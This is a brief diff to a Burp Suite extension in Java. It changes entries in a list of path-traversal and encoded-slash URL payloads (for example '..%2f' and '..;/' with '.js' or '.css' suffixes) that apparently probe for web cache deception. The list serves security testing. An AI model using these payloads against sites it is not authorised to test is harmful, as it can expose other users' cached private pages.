@@ -951,7 +951,7 @@ public class CustomRequestEditorTab implements BurpExtension {
             
 
             "/resource/../../../MainPath/;.js",
-            "/resources/..%2fmy-account?wcd",
+            "/resources/..%2fMainPath?wcd",
             "/js/../../MainPath?abcd.css",
             "/resource/_/../../MainPath/js;main.js",
             "/resources/..%2fMainPath",
@@ -996,7 +996,7 @@ public class CustomRequestEditorTab implements BurpExtension {
             "/cdn/%2e%2e/%2e%2e/MainPath",
             "/cdn/..;/MainPath",
             "/cdn/.js/../MainPath",
-            "/cdn/..%2fMainPath.js?version=1.2.3",
+            "/cdn/..%2fMainPath?file=main.js",
             "/resources/%2e%2e/%2e%2e/%2e%2e/MainPath",
             "/resources/..%2f..%2f..%2fMainPath",
             "/resources///../MainPath",
